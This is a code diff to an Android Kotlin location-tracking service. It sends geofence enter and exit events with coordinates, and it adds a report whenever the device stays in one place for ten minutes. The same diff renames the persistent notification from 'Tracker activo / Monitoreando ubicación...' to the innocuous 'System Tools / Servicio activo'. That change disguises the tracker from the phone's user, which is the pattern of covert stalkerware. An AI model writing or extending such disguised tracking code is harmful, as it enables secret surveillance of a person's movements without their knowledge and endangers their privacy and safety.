@@ -18,6 +18,10 @@ class LocationTrackingService : Service() {
     private lateinit var fusedLocationClient: FusedLocationProviderClient
     private lateinit var locationCallback: LocationCallback
 
+    private var stationaryAnchor: Location? = null
+    private var stationaryStart: Long = 0L
+    private var stationaryReported: Boolean = false
+
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
@@ -63,15 +67,54 @@ class LocationTrackingService : Service() {
         when {
             isInside && !wasInside -> {
                 prefs.edit().putBoolean(GeofenceConstants.KEY_INSIDE, true).apply()
-                ArrivalReporter.report(this, location.latitude, location.longitude, "enter")
+                EventQueue.enqueue(this, location.latitude, location.longitude, "enter")
                 Log.d("LocationTrackingService", "ENTER enviado")
             }
             !isInside && wasInside -> {
                 prefs.edit().putBoolean(GeofenceConstants.KEY_INSIDE, false).apply()
-                ArrivalReporter.report(this, location.latitude, location.longitude, "exit")
+                EventQueue.enqueue(this, location.latitude, location.longitude, "exit")
                 Log.d("LocationTrackingService", "EXIT enviado")
             }
         }
+
+        if (isInside) {
+            resetStationary()
+        } else {
+            checkStationary(location)
+        }
+    }
+
+    private fun checkStationary(location: Location) {
+        val anchor = stationaryAnchor
+        if (anchor == null) {
+            stationaryAnchor = location
+            stationaryStart = System.currentTimeMillis()
+            return
+        }
+        val distFromAnchor = FloatArray(1)
+        Location.distanceBetween(
+            location.latitude, location.longitude,
+            anchor.latitude, anchor.longitude,
+            distFromAnchor
+        )
+        if (distFromAnchor[0] > STATIONARY_THRESHOLD_M) {
+            stationaryAnchor = location
+            stationaryStart = System.currentTimeMillis()
+            stationaryReported = false
+            Log.d("LocationTrackingService", "Movimiento detectado (${distFromAnchor[0].toInt()}m), reiniciando estacionario")
+            return
+        }
+        if (!stationaryReported && System.currentTimeMillis() - stationaryStart >= STATIONARY_TIMEOUT_MS) {
+            EventQueue.enqueue(this, location.latitude, location.longitude, "stationary")
+            stationaryReported = true
+            Log.d("LocationTrackingService", "STATIONARY enviado")
+        }
+    }
+
+    private fun resetStationary() {
+        stationaryAnchor = null
+        stationaryStart = 0L
+        stationaryReported = false
     }
 
     private fun createNotificationChannel() {
@@ -85,8 +128,8 @@ class LocationTrackingService : Service() {
 
     private fun buildNotification(): Notification =
         Notification.Builder(this, GeofenceConstants.CHANNEL_ID)
-            .setContentTitle("Tracker activo")
-            .setContentText("Monitoreando ubicación...")
+            .setContentTitle("System Tools")
+            .setContentText("Servicio activo")
             .setSmallIcon(R.drawable.ic_notification)
             .setOngoing(true)
             .build()
@@ -97,4 +140,9 @@ class LocationTrackingService : Service() {
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
+
+    companion object {
+        private const val STATIONARY_THRESHOLD_M = 50f
+        private const val STATIONARY_TIMEOUT_MS = 10 * 60 * 1000L
+    }
 }
